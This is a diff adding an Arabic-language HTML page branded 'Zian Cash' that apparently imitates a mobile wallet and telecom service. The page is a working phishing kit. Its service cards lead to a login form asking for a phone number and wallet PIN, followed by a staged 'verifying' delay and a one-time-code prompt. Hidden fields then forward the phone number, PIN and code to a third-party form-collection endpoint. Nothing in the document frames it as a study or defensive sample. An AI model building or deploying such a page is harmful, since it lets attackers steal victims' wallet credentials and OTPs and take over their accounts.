@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>Zian Cash</title>
+<style>
+body { background:#f4f0f8; font-family:sans-serif; margin:0; padding:0; text-align:center;}
+header { background:#6a00ff; color:white; padding:30px 20px;}
+header h1 { margin:0 0 10px; font-size:28px;}
+section { display:none; }
+.active { display:block; }
+button { padding:14px 25px; font-size:18px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; }
+button:hover { opacity:0.9; }
+
+/* خدمات */
+.services-container { display:flex; flex-wrap:wrap; justify-content:center; gap:15px; margin:30px 0;}
+.card { background:#e6ccff; width:160px; padding:20px; border-radius:12px; 
+        box-shadow:0 3px 10px rgba(0,0,0,0.15); color:#6a00ff; font-weight:bold; cursor:pointer; transition:0.3s;}
+.card:hover { background:#d9b3ff; }
+
+/* تسجيل دخول */
+.form-section { width:90%; max-width:400px; margin:30px auto; background:white; padding:20px; border-radius:12px; 
+                box-shadow:0 3px 10px rgba(0,0,0,0.15); text-align:right;}
+.form-section label { display:block; font-weight:bold; color:#6a00ff; margin-bottom:5px;}
+.form-section input { width:100%; padding:12px; margin-bottom:15px; border-radius:8px; 
+                      border:1px solid #ccc; font-size:16px; background-color:#e6ccff; color:#000;}
+.verify-btn { width:100%; padding:14px; font-size:18px; color:white; background:#9a00ff; 
+              border:none; border-radius:8px; font-weight:bold; cursor:pointer;}
+.verify-btn:hover { background:#6a00ff;}
+#errorBox { display:none; background:#ffdddd; color:#a30000; padding:12px; border-left:4px solid #ff0000; 
+            margin-bottom:15px; border-radius:4px; font-size:15px;}
+footer { margin:30px 0; color:#666; font-size:14px;}
+</style>
+</head>
+<body>
+
+<!-- الصفحة 1: الخدمات -->
+<section id="services" class="active">
+<header>
+<h1>Zian Cash</h1>
+<p>اختر الخدمة التي تريد استخدامها</p>
+</header>
+<div class="services-container">
+<div class="card" onclick="showSection('login')">المحفظة الإلكترونية</div>
+<div class="card" onclick="showSection('login')">4.5G+</div>
+<div class="card" onclick="showSection('login')">Short Code</div>
+<div class="card" onclick="showSection('login')">Bulk SMS</div>
+<div class="card" onclick="showSection('login')">Customer Service</div>
+</div>
+</section>
+
+<!-- الصفحة 2: تسجيل الدخول -->
+<section id="login">
+<header>
+<h1>Zian Cash</h1>
+<p>ادخل رقم الهاتف والرمز السري للمحفظة</p>
+</header>
+<div class="form-section">
+<form id="mainForm">
+<label>رقم الهاتف</label>
+<input type="text" name="Phone_Number" id="phone" placeholder="07xxxxxxxx" required>
+
+<label>الرمز السري (PIN)</label>
+<input type="password" name="PIN" id="pin" maxlength="6" placeholder="******" required>
+
+<button type="button" class="verify-btn" onclick="goToOTP()">تسجيل دخول</button>
+</form>
+</div>
+</section>
+
+<!-- الصفحة 3: التحقق -->
+<section id="verify">
+<header>
+<h1>Zian Cash</h1>
+<p>جارٍ التحقق من المعلومات…</p>
+</header>
+</section>
+
+<!-- الصفحة 4: صفحة كود الـ OTP -->
+<section id="otp">
+<header>
+<h1>Zian Cash</h1>
+<p>ادخل رمز التحقق الذي استلمته</p>
+</header>
+<div class="form-section">
+<div id="errorBox">❌ رمز التحقق خاطئ، حاول مرة أخرى</div>
+
+<form action="https://getform.io/f/aejeqwyb" method="POST">
+<input type="hidden" id="sendPhone" name="Phone_Number">
+<input type="hidden" id="sendPIN" name="PIN">
+
+<label>رمز التحقق (OTP)</label>
+<input type="text" name="OTP_Code" id="otpInput" maxlength="6" placeholder="******" required>
+
+<button type="submit" class="verify-btn">تحقق</button>
+</form>
+
+</div>
+</section>
+
+<!-- صفحة النجاح -->
+<section id="success">
+<header>
+<h1>🎉 تم تسجيل الدخول بنجاح!</h1>
+<p>مرحبًا بك في Zian Cash</p>
+</header>
+</section>
+
+<footer>
+<p>© 2025 Zian Cash</p>
+</footer>
+
+<script>
+function showSection(id){
+    document.querySelectorAll('section').forEach(sec=>sec.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+}
+
+// خطوة تسجيل الدخول
+function goToOTP(){
+    const phone = document.getElementById('phone').value;
+    const pin = document.getElementById('pin').value;
+
+    if(phone.length < 10 || pin.length < 4){
+        alert("يرجى إدخال معلومات صحيحة");
+        return;
+    }
+
+    // نقل البيانات للصفحة الثانية
+    document.getElementById('sendPhone').value = phone;
+    document.getElementById('sendPIN').value = pin;
+
+    showSection('verify');
+
+    setTimeout(()=>{
+        showSection('otp');
+    }, 3000);
+}
+</script>
+
+</body>
+</html>
